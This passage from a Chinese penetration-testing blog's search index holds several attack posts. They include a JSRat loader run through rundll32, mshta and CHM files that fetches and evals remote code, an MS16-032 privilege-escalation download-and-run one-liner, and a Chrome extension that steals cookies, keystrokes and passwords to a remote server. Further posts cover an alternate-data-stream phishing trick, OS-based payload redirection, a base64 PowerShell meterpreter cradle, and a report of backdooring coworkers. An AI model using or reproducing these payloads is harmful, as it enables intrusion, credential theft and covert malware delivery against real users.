classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"; new ActiveXObject("WScript.Shell").Run(rat,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 3.Use WSC运行计算器1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://urlto/calc.wsc") calc.wsc12345678910111213&lt;?xml version="1.0"?&gt;&lt;package&gt;&lt;component id="testCalc"&gt;&lt;script language="JScript"&gt;&lt;![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]&gt;&lt;/script&gt;&lt;/component&gt;&lt;/package&gt; 运行JSRAT1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://urlto/JSRAT.wsc") JSRAT.wsc:1234567891011121314&lt;?xml version="1.0"?&gt;&lt;package&gt;&lt;component id="testCalc"&gt;&lt;script language="JScript"&gt;&lt;![CDATA[ rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"; new ActiveXObject("WScript.Shell").Run(rat,0,true);]]&gt;&lt;/script&gt;&lt;/component&gt;&lt;/package&gt; 4.Use MSHTA1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125;]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>jsrat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MS16-032 windows本地提权]]></title>
    <url>%2Farchives%2FMS16-032-Windows-Privilege-Escalation.html</url>
    <content type="text"><![CDATA[exploit-db的详情：https://www.exploit-db.com/exploits/39574/ 试用系统：Tested on x32 Win7, x64 Win8, x64 2k12R2 提权powershell脚本： Invoke-MS16-032.ps1 测试详情： 为了方便使用，对这个脚本进行了简单的修改，可以执行任意程序，并可以添加参数执行（全程无弹框）脚本地址为：Invoke-MS16-032.ps1 使用方式如下:添加用户： 运行某程序： 远程加用户：直接执行如下命令，可进行提权并添加用户：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'" 演示如下：]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack With Chrome Extension]]></title>
    <url>%2Farchives%2FHack_With_Chrome_Extension.html</url>
    <content type="text"><![CDATA[0x00 Introduction众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。 撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。 0x01 Write Chrome Extension在知道怎么写插件之前，我们首先了解一下插件的文件结构，随便下载一个谷歌插件,将其重命名为zip后缀之后进行解压，解压后的文件目录如下： 其中，manifest.json是主文件，来声明要写的插件的相关信息。可以把mainfest.json理解成插件的入口，即chrome需要通过manifest.json来理解你的插件要引用哪些文件 、 需要哪些权限 、 插件图标 等信息。而其他文件，就是能实现此插件功能的脚本文件以及插件图标等。 下面，我们开始构造我们的hack extension。首先， 编写manifest.json文件如下:1234567891011121314151617181920212223242526272829303132333435363738394041&#123; "name": "demo", //插件显示的名称 "description": "demo", //插件的描述 "version": "1.0", //插件的版本 "manifest_version": 2, //新版chrome强制manifest_version为2 //插件的图标 "icons": &#123; "16": "imgs/ico.png", "32": "imgs/ico.png", "48": "imgs/ico.png", "128": "imgs/ico.png" &#125;, //定义后台的一些特性 "background":&#123; "scripts":[ //加载插件的时候执行的脚本 "js/call.js", "lib/jquery.min.js" ] &#125;, "content_scripts": [//定义自动加载的内容 &#123; "matches": [ //满足什么样的条件执行该插件 "&lt;all_urls&gt;" ], "js": [ "lib/jquery.min.js", //满足以后执行的脚本 "js/check.js" ] &#125; ], //插件的权限 "permissions": [ "tabs", "http://*/", "https://*/", "background", "webRequest", "storage", "browsingData" ]&#125; 创建以下文件： 现在，所有的文件就全了，但是还没什么功能，尝试加载一下插件，浏览器URL栏输入 chrome://extensions/ 选择加载已解压的扩展程序，之后选择文件所在的文件夹。 然后插件就已经被加载上了： 0x02 How to Hack插件已经可以被成功加载了，怎么使用它来进行攻击呢，我们开始编写。 1、XSS Platform配置XSS平台，获取项目代码如下：1&lt;script src=http://t.cn/xxxxxxx&gt;&lt;/script&gt; 访问http://t.cn/xxxxxx 获取代码，将其写入check.js，内容如下：12 (function()&#123;(new Image()).src='http://xss9.com/index.php?do=api&amp;id=xxxxxx&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();if(''==1)&#123;keep=new Image();keep.src='http://xss9.com/index.php?do=keepsession&amp;id=xxxxxx&amp;url='+escape(document.location)+'&amp;cookie='+escape(document.cookie)&#125;; 保存文件，重新加载插件，访问任意网站，获取访问网站的cookie信息，如下图： 2、Keyloger将以下Payload写入check.js中：123456789101112131415161718$(document).ready(function()&#123; var server = "http://server.com/"; //接收服务器 var gate = "data.php?data="; //接收文件 var tabURL = window.location.href; var keys=''; document.onkeypress = function(e) &#123; get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); keys+=key; &#125; window.setInterval(function()&#123; new Image().src = server+gate+keys; keys = ''; &#125;, 1000); &#125;); 接收php文件如下，将此文件命名为data.php置于服务器上：123456&lt;?php$txt = $_GET['data'];$log = fopen("keylog.txt", "a") or die("Unable to open file!");fwrite($log, $txt);fclose($log);?&gt; 需要在服务器上建立keylog.txt,然后给777权限就可以了 加载插件以后，键盘记录启动，当用户在网页中进行键盘输入时，输入数据会发送到远程服务器。 3、ForceDownload强制下载文件Payload如下，此payload即安装插件以后，访问任意网站强制下载程序：123456789101112$(document).ready(function()&#123; var server = "http://server.com/"; //服务器 var gate = "/test/test.exe"; //要下载的文件 var tabURL = window.location.href; var link = document.createElement('a');link.href = server+gate;link.download = '';document.body.appendChild(link);link.click(); &#125;); 4、Get Wooyun Password以下Payload 用于获取登陆wooyun的账号密码。123456789101112131415161718192021222324$(document).ready(function()&#123; var server = "http://xss9.com/"; //发送地址 var gate = "index.php?do=api&amp;id=xxxxx"; //接收参数 var tabURL = window.location.href; if(tabURL.indexOf('wooyun.org') !== -1 ) &#123; wooyun(); &#125; function email() &#123; var email = document.getElementsByName('email')[0].value; var password = document.getElementsByName('password')[0].value; var data = "&amp;username="+email+"&amp;password="+password; new Image().src = server+gate+data; //console.log("email="+email+"&amp;password="+password) &#125; function wooyun() &#123; document.getElementById('subbtn').onmouseover = email; &#125; &#125;); 修改payload可针对性获取某网站账号密码信息。 Payload就介绍这么多了，熟悉前端的童鞋一定可以创造更多花式玩儿法。 0x03 When to Use或许小伙伴们会问，弄这个有什么用，我又不需要装这个插件抓自己的密码。当然，这个肯定不是用来搞自己的。渗透测试过程中，有没有碰到过看到管理员经常使用Chrome浏览器，而我们却没办法获取到其常用密码呢？（管理员并没有使用浏览器记住密码的功能）。这个时候，除了给系统装键盘记录器，我们还可以为其浏览器装我们编写的插件。而这个插件，就可以用来搜集各种敏感信息，而且，针对的是浏览器访问的所有网站！ 除此之外，我发现chrome是可以通过命令行来安装插件的，来设想一个场景，我们使用某个漏洞，或者社会工程学获取了小明的计算机控制权，现在已经有了一个meterpreter会话如下： 执行如下命令：1meterpreter &gt; run post/windows/gather/enum_chrome 可以看到目标系统是安装了chrome浏览器的。 上传插件目录demo到e:\demo\ 目录，由于meterpreter的upload只能上传文件，不能上传文件夹，所以这里需要把demo文件夹打包压缩以后再上传，之后再通过目标系统的解压软件或者自己上传的unrar.exe进行解压，具体操作如下图: 使用如下命令寻找安装的解压软件： 之后使用如下命令进行解压并删除压缩包，具体操作如下图： 之后为chrome添加插件，使用如下命令：1"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension="F:\demo\demo" --silent-launch 路径为chrome默认安装路径，如果找不到，可以使用dir命令来找，--load-extension是要加载的插件路径，--silent-launch表示不开启chrome，静默安装。注意：需要在chrome未运行的情况下才可成功加载插件。 使用以上命令有现在两点缺点：缺点一，会有如下提示（过几秒会消失）。 缺点二，有图标，有提示。 一直在想办法解决以上问题，图标可以换成透明的或者常用的插件图片来解决，另外两个暂时还没解决，详细的chrome命令可以参考这里: chromium-command-line，有小伙伴有了解决方案还请不吝赐教。当然也可以尝试写一个小程序来监控chrome，一旦chrome打开，则模拟点击事件点击取消按钮。 最好的方式就是可以直接去为他安装插件，然后点了这几个提示之后，之后的使用则不会再次出现提示，这样可以隐藏挺长时间。 然后，我就控制小明的所有访问内容了，就像这个图一样： 当然除了以上的利用方式，还可以通过发布一些插件让其含有攻击代码同样可以实现此功能。 0x04 How to Defend对于不明来历的插件尽量不要安装，如果发现问题，请尽早修改自己各个账号密码。 0x05 Summarize此文主要介绍在渗透测试过程中的一种思路，有兴趣的小伙伴可以继续测试其他浏览器的插件，这种方式虽然简单，但是效果还不错，你值得拥有。以上文件可以通过这里下载：Extension_Backdoor。 0x06 Consult1.http://peter.sh/experiments/chromium-command-line-switches/#condition-212.http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html3.https://developer.chrome.com/extensions/external_extensions4.http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用文件流ADS 及 JavaScript 进行钓鱼攻击]]></title>
    <url>%2Farchives%2Fcreating-a-malicious-javascript-by-utilizing-alternate-data-streams.html</url>
    <content type="text"><![CDATA[1.创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。 2.将程序写入文件流（此处用calc.exe） type calc.exe &gt; test.txt:calc.exe 3.使用mklink创建文件链接： mklink config.txt test.txt:calc.exe 4.创建readme.txt，文件内容随便。设置为隐藏。 5.创建readme.js，内容如下： var objShell = new ActiveXObject(&quot;shell.application&quot;); objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0); objShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1); 执行readme.js，运行calc.exe ，打开readme.txt]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Operating System Based Redirection with Apache mod_rewrite]]></title>
    <url>%2Farchives%2Foperating-system-based-redirection-with-apache-mod_rewrite.html</url>
    <content type="text"><![CDATA[可以通过此针对不同操作系统来执行不同的paylaod index.html：12345678910111213141516171819202122&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var url_base='http://'+window.location.host;var OSName="unknown";var query_string=document.location.search;var request_path=window.location.pathname.substr(1);if (navigator.appVersion.indexOf("Win")!=-1) OSName="windows";if (navigator.appVersion.indexOf("Mac")!=-1) OSName="mac";if (navigator.appVersion.indexOf("X11")!=-1) OSName="unix";if (navigator.appVersion.indexOf("Linux")!=-1) OSName="linux";var os_string='&amp;os_id='+OSName;if (query_string == '') os_string='?os_id='+OSName;if (query_string.indexOf("os_id=")!=-1) os_string='';window.location.replace(url_base+'/'+request_path+query_string+os_string);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; mod_rewrite 规则： 将下面的规则写在.htaccess文件中，更换TEAMSERVER-WAN-IP以及OS-payload123456789101112RewriteEngine OnRewriteCond %&#123;QUERY_STRING&#125; os_id=macRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/MAC-OS-X-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=windowsRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/WINDOWS-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=unixRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNIX-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=linuxRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/LINUX-PAYLOAD [P]RewriteCond %&#123;QUERY_STRING&#125; os_id=unknownRewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/UNKNOWN-OS-PAYLOAD [P]RewriteRule ^(.*)$ http://TEAMSERVER-WAN-IP/OS-DETECTOR.HTML [P] 演示如下： 详情：戳我 配置文件在这里：戳我]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[高级组合技打造“完美” 捆绑后门]]></title>
    <url>%2Farchives%2Fchm_backdoor.html</url>
    <content type="text"><![CDATA[0x00 简介之前写过一篇关于客户端钓鱼的文章：《使用powershell Client进行有效钓鱼》中，在使用各个Client进行测试的过程中，个人发现CHM文件是最好用的一个，但是其缺点就是会弹黑框，这样就会让被攻击者察觉。那么怎么让他不弹黑框呢？那就是本文要介绍的内容啦~ 0x01 CHM 简介在介绍怎么使用CHM来作为后门之前，首先要知道CMH是什么东西。CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。CHM支持Javas cript、VBs cript、ActiveX、Java Applet、Flash、常见图形文件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过URL与Internet联系在一起。因为使用方便，形式多样也被采用作为电子书的格式。 0x02 CHM 制作CHM的制作方法很多。有多款工具可以使用，这里就不在做详细的介绍了。本次测试使用了EasyCHM来制作CHM文件，使用起来非常简单。新建如下目录，文件内容随意： 打开EasyCHM，新建-&gt;浏览。选择该目录。默认文件类型： 点击确认，即可看到预览的CHM文件： 选择编译，即可编译成CHM文件。 0x03 CHM Execute Command14年的时候@ithurricanept 在twitter上发了一个demo，通过CHM运行计算器： 利用代码如下：123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;&lt;PARAM name="Command" value="ShortCut"&gt; &lt;PARAM name="Button" value="Bitmap::shortcut"&gt; &lt;PARAM name="Item1" value=',calc.exe'&gt; &lt;PARAM name="Item2" value="273,1,1"&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; 将以上代码写入html，置于工程目录进行编译，生成CHM文件，运行此文件，弹出计算器： 0x04 去除弹框有测试过nishang Out-CHM 的同学会发现，运行生成的CHM文件的时候会看到明显的弹框。就像这样: 某个晚上突然脑洞了一下，想到了一个好的方式来让他不显示弹框，即结合使用JavaScript Backdoor。经过测试，成功实现在不弹框的情况下获取meterpreter会话，此次测试使用一个我修改过的python版 JSRat.ps1 ，地址为：https://github.com/Ridter/MyJSRat。使用方式详见 readme。 以下为完整的测试过程： 1、结合CHM + JSBackdoor使用交互模式的JSRat server：1python MyJSRat.py -i 192.168.1.101 -p 8080 访问 http://192.168.1.101:8080/wtf 获取攻击代码如下：1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.101:8080/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125; 经过多次测试，成功将以上命令写入chm，其Html代码为：123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;This is a demo ! &lt;br&gt;&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;&lt;PARAM name="Command" value="ShortCut"&gt; &lt;PARAM name="Button" value="Bitmap::shortcut"&gt; &lt;PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.101:8080/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;'&gt; &lt;PARAM name="Item2" value="273,1,1"&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt; 编译以后运行，可以成功获取JS交互shell: 直接执行cmd /c command 是会有黑框的，可以使用run来避免显示黑框。执行run以后，输入 whoami &gt; e:\1.txt 之后通过read 来获取回显。 2、获取meterpreter会话此次测试获取meterpreter会话的方式是通过执行powershell命令，直接获取，当获取客户端JS 交互shell之后自动执行powershell命令，获取meterpreter会话。具体操作如下：开启MSF web_delivery：1234567891011121314151617181920212223 ~ msfconsole -Lqmsf &gt; use exploit/multi/script/web_deliverymsf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set lhost 192.168.1.101lhost =&gt; 192.168.1.101msf exploit(web_delivery) &gt; set lport 6666lport =&gt; 6666msf exploit(web_delivery) &gt; set SRVPORT 8081SRVPORT =&gt; 8081msf exploit(web_delivery) &gt; set uripath /uripath =&gt; /msf exploit(web_delivery) &gt; exploit[*] Exploit running as background job.msf exploit(web_delivery) &gt;[*] Started reverse TCP handler on 192.168.1.101:6666[*] Using URL: http://0.0.0.0:8081/[*] Local IP: http://192.168.1.101:8081/[*] Server started.[*] Run the following command on the target machine:powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); 装有powershell的客户端执行以下命令则可获取meterpreter会话：1powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); 由于存在特殊字符，我们可以把以上代码编码为base64格式，将以下代码存入power.txt1234$n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('http://192.168.1.101:8081/'); 执行以下命令：1cat power.txt | iconv --to-code UTF-16LE |base64 最终要执行的powershell命令为：1powershell -ep bypass -enc IAAkAG4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AAoAIAAkAG4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsACgAgACQAbgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoAIABJAEUAWAAgACQAbgAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAxADoAOAAwADgAMQAvACcAKQA7AA== 使用执行命令模式直接获取meterpreter会话：1python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AAoAIAAkAG4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsACgAgACQAbgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoAIABJAEUAWAAgACQAbgAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAxADoAOAAwADgAMQAvACcAKQA7AA==" 测试过程中，从运行CHM到获取meterpreter，客户端无明显异常，全程无黑框弹出，获取到meterpreter会话如下图： 3、是否被杀？可能很多人会问，会不会被杀，下面是virscan的查杀结果：http://r.virscan.org/report/6173ee9c62d29806bb84035a8f1738ba 0x05 利用场景一张图说明（让我猜猜你会不会点）： 注: 随便找了几个漏洞利用工具修改了文件名，并不代表原作者分享的工具有问题。 0x06 实际测试是用上述方式制作chm文件，命名为一个比较有吸引力的名字，比如在公司技术群发了一个名字为”制作免杀后门.chm”的文件，实际测试结果如下图： 成功获取多个人的meterpreter会话。 0x07 防御目前我还没查到什么防御的姿势，知道的小伙伴可以分享一下。最好就是提高个人安全意识，对于这类文件，多注意一下，尽量别乱点，如果非要点，可以放到虚拟机里面。使用procexp.exe可以看到存在后门的chm文件会开启新的进程： 对于碰到这种后门，怎么溯源呢，其实也很简单，chm是可以反编译为html的。使用windows自带的hh.exe 则可进行反编译。命令如下：1C:\Users\evi1cg\Desktop&gt;hh -decompile test poc.chm #test 为当前目录的test文件夹 执行结果如下： 这样就可以看到其源代码并可以找到攻击者的监听服务器了。 0x08 小结此次测试就是对一些已知的攻击手法进行结合，结果是让此捆绑后门更加隐蔽，近乎“完美”，美中不足的是在文件开启的时候会出现短暂的卡顿。有时候小漏洞结合起来能造成大危害，小手法结合起来也能成大杀器。本着分享的精神将此姿势介绍，希望小伙伴们能免受其害。 0x09 参考1.https://twitter.com/ithurricanept/status/5349937431960903682.https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps13.http://drops.wooyun.org/tips/11764]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>chm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mousejack_replay]]></title>
    <url>%2Farchives%2Fmousejack_replay.html</url>
    <content type="text"><![CDATA[0x00 简介Bastille的研究团队发现了一种针对蓝牙键盘鼠标的攻击，攻击者可以利用漏洞控制你的电脑操作。研究团队将此攻击命名为MouseJack。 Mousejack 之前在Freebuf上有所介绍：MouseJack：利用15美元的工具和15行代码控制无线鼠标和键盘，当然，制作团队也将部分测试代码公开在github上，该团队网站地址为：https://www.mousejack.com/ 从视频中，可以看到攻击者通过此技术，直接操纵受害者电脑，但由于目前该团队并没有公开完整代码，所以有了下面的测试代码。 怎么烧固件这里就不说了，在原github有详细说明，drops也有介绍:Mousejack测试指南，如果在windows平台，我也写过一个介绍:windows下刷MouseJack固件。 0x01 原脚本测试该团队所公布的代码主要包括了扫描跟嗅探模块，nrf24-network-mapper.py 中并没有能够让鼠标操作发生明显变化的payload，经过多次测试，写出了此测试脚本，能够完成对无线鼠标操作的重放攻击。 0x02 脚本介绍scanner使用原作者的扫描脚本，此脚本用来扫描附近的无线鼠键： 123456789usage: ./nrf24-scanner.py [-h] [-c N [N ...]] [-v] [-l] [-p PREFIX] [-d DWELL]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -p PREFIX, --prefix PREFIX Promiscuous mode address prefix -d DWELL, --dwell DWELL Dwell time per channel, in milliseconds 扫描信道 1-5 的设备： 1./nrf24-scanner.py -c &#123;1..5&#125; 扫描起始地址为0xA9的设备的所有信道： 1./nrf24-scanner.py -p A9 sniffer修改原作者脚本，将获取的设备数据存储到pack.log 中，之后可以使用mousejack-replay.py脚本对此数据进行重放： 1234567891011usage: ./nrf24-sniffer.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-t TIMEOUT] [-k ACK_TIMEOUT] [-r RETRIES]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -a ADDRESS, --address ADDRESS Address to sniff, following as it changes channels -t TIMEOUT, --timeout TIMEOUT Channel timeout, in milliseconds -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT ACK timeout in microseconds, accepts [250,4000], step 250 -r RETRIES, --retries RETRIES Auto retry limit, accepts [0,15] 嗅探地址为 61:49:66:82:03 设备所有信道的数据包并将数据包保存： 1./nrf24-sniffer.py -a 61:49:66:82:03 mousejack-replay.py在 network mapper 脚本上修改，首先通过Ping获取可用信道，然后读取pack.log中的数据包内容，将每一条数据发送到各个信道，完成数据包重放,测试过程中，发现可用地址一般为3-4个，所以将原脚本改成rang(4)： 1234567891011usage: ./mousejack-replay.py [-h] [-c N [N ...]] [-v] [-l] -a ADDRESS [-p PASSES] [-k ACK_TIMEOUT] [-r RETRIES]optional arguments: -h, --help show this help message and exit -c N [N ...], --channels N [N ...] RF channels -v, --verbose Enable verbose output -l, --lna Enable the LNA (for CrazyRadio PA dongles) -a ADDRESS, --address ADDRESS Known address -p PASSES, --passes PASSES Number of passes (default 2) -k ACK_TIMEOUT, --ack_timeout ACK_TIMEOUT ACK timeout in microseconds, accepts [250,4000], step 250 -r RETRIES, --retries RETRIES Auto retry limit, accepts [0,15] 指定地址为 61:49:66:82:03 的设备进行数据包重放： 1./mousejack-replay.py -a 61:49:66:82:03 0x03备注以上为个人测试结果，由于目前手上只有一个鼠标可以测试，可能并不适用所有存在漏洞设备，有兴趣的小伙伴可以找我一起研究，可以对脚本进行进一步的完善。 右键点击演示视频：http://v.youku.com/v_show/id_XMTUwMTQ3Njk4NA==.html 数据重放演示视频：http://v.youku.com/v_show/id_XMTUwMzgwMTQ1Ng==.html 视频录的不太好，看不太清楚效果，有兴趣的小伙伴可以测试一下。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>mousejack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mousejack 测试]]></title>
    <url>%2Farchives%2Fmousejack.html</url>
    <content type="text"><![CDATA[右键点击测试视频：]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
      <tags>
        <tag>mousejack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过VPS SSH隧道使用本地msf]]></title>
    <url>%2Farchives%2FPort_Forward_using_VPS_SSH_Tunnel.html</url>
